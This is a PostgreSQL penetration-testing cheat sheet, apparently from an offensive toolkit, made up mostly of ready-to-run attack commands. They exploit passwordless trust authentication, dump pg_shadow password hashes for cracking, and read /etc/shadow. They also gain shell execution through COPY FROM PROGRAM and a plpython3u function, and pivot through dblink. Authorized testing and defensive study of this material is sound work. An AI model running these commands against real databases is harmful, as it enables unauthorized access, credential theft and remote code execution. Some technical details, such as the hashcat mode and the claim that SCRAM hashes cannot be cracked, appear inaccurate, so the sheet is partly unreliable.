---
service: postgres
title: PostgreSQL
ports: 5432
aliases: postgresql, pgsql
---

# PostgreSQL — quick wins

**When you see it:** 5432/tcp open and `psql -h H -U postgres` connects without
a password → trust auth, likely superuser access, and COPY-based RCE is one
statement away.

> Authorized testing only. Triage is read-only; steps marked ✏️ write to or
> execute on the target — get sign-off and clean up afterwards.

## Triage (read-only)
```sh
# Banner + empty-password probe
nmap -sV -p5432 --script pgsql-info,pgsql-empty-password H

# Trust-auth probe (no password)
PGPASSWORD='' PGCONNECT_TIMEOUT=5 psql -h H -U postgres -d postgres -c "SELECT version();"

# Check superuser status and roles
psql -h H -U U -d postgres -At \
  -c "SELECT current_user, session_user;" \
  -c "SELECT rolname, rolsuper, rolcreaterole FROM pg_roles;"

# Hash dump (superuser required)
psql -h H -U U -d postgres -c "SELECT usename, passwd FROM pg_shadow;"
```

## Quick wins

### Trust authentication — no password
```sh
PGPASSWORD='' psql -h H -U postgres -d postgres
PGPASSWORD='' psql -h H -U admin    -d postgres
```
*Why:* `pg_hba.conf` entries using `trust` for host connections grant any
matching user access with no credential check. Default in some lab/dev deploys.

### Dump password hashes for offline cracking
```sh
psql -h H -U U -d postgres -At \
  -c "SELECT usename, passwd FROM pg_shadow WHERE passwd IS NOT NULL;"
```
*Why:* `pg_shadow` stores MD5 (`md5<hash>`) or SCRAM-SHA-256 hashes — crack
MD5 hashes offline with hashcat mode 28800 (format: `md5<hash>:username`).
Requires superuser.

### COPY FROM PROGRAM — RCE ✏️
```sh
# Postgres 9.3+ (CVE-2019-9193), requires superuser or pg_execute_server_program (11+)
psql -h H -U U -d postgres \
  -c "DROP TABLE IF EXISTS cmd_out;"  \
  -c "CREATE TABLE cmd_out(output text);" \
  -c "COPY cmd_out FROM PROGRAM 'id';" \
  -c "SELECT * FROM cmd_out;"
```
*Why:* `COPY FROM PROGRAM` executes a shell command as the postgres OS user and
captures stdout. Superuser is required on versions prior to 11; PG 11+ allows
members of `pg_execute_server_program`. Patched in distros applying the
CVE-2019-9193 guidance but the SQL syntax itself is not removed.

### File read via pg_read_file
```sh
psql -h H -U U -d postgres \
  -c "SELECT pg_read_file('/etc/passwd');"
# For arbitrary paths (superuser, 9.4+):
psql -h H -U U -d postgres \
  -c "SELECT pg_read_binary_file('/etc/shadow');"
```
*Why:* `pg_read_file` reads files inside the data directory by default;
`pg_read_binary_file` with an absolute path reaches any file readable by the
postgres user. Superuser required.

### Large object file read/write ✏️
```sh
# Read a file via large-object import + export
psql -h H -U U -d postgres \
  -c "SELECT lo_import('/etc/passwd', 1337);" \
  -c "SELECT lo_export(1337, '/tmp/out.txt');" \
  -c "SELECT data FROM pg_largeobject WHERE loid=1337;" \
  -c "SELECT lo_unlink(1337);"  # cleanup
```
*Why:* `lo_import`/`lo_export` provide an alternative file-read path when
`pg_read_binary_file` is unavailable; `lo_export` writes files as the postgres
OS user. Requires superuser.

### Untrusted PL — RCE via plpython3u / plperlu ✏️
```sh
# Check if untrusted languages are installed
psql -h H -U U -d postgres -c "SELECT lanname FROM pg_language WHERE lanpltrusted='f';"

# If plpython3u is available:
psql -h H -U U -d postgres \
  -c "CREATE OR REPLACE FUNCTION rce(cmd text) RETURNS text AS \$\$
      import subprocess; return subprocess.check_output(cmd,shell=True,text=True)
      \$\$ LANGUAGE plpython3u;" \
  -c "SELECT rce('id');"
```
*Why:* `plpython3u` and `plperlu` are untrusted languages that execute with
postgres OS-user context — arbitrary code execution. Requires superuser to
`CREATE FUNCTION ... LANGUAGE plpython3u`.

### dblink — pivot to another Postgres instance
```sh
psql -h H -U U -d postgres \
  -c "SELECT dblink_connect('hostaddr=TARGET_IP port=5432 user=U password=P dbname=postgres');" \
  -c "SELECT * FROM dblink('SELECT current_user') AS t(u text);"
```
*Why:* `dblink` lets you run queries against a second Postgres instance from
within the first — lateral movement when the database server can reach internal
hosts the operator cannot.

## aranum helpers
- `aranumtoolkit/network/enum-postgres.sh` — produced this finding (nmap NSE,
  trust-auth probe, role/superuser dump, nxc cred spray).
- No standalone exploit helper exists; manual steps above apply.

## Gotchas
- `pg_hba.conf` controls access per-address; trust auth is often limited to
  localhost — confirm the remote connection isn't being rejected at the HBA layer
  before assuming weak auth.
- `COPY FROM PROGRAM` syntax exists in 9.3+ but many distros backport a
  superuser-only restriction; check `\du` role flags first.
- `pg_shadow` requires superuser; non-superuser sessions see `pg_user` (no
  hashes). `pg_authid` also has hashes but is also superuser-only.
- SCRAM-SHA-256 hashes (PG 14+ default) are not crackable with standard hashcat
  modes as of mid-2025 without knowing the salt iteration — MD5 hashes are the
  high-value target.
- `pg_read_binary_file` with absolute paths was restricted to superuser in PG 11;
  members of `pg_read_server_files` also qualify in 11+.

## Sources
- HackTricks `5432-pentesting-postgresql`; CVE-2019-9193 advisory; PayloadsAllTheThings
  PostgreSQL section; Hackviser PostgreSQL enumeration guide.
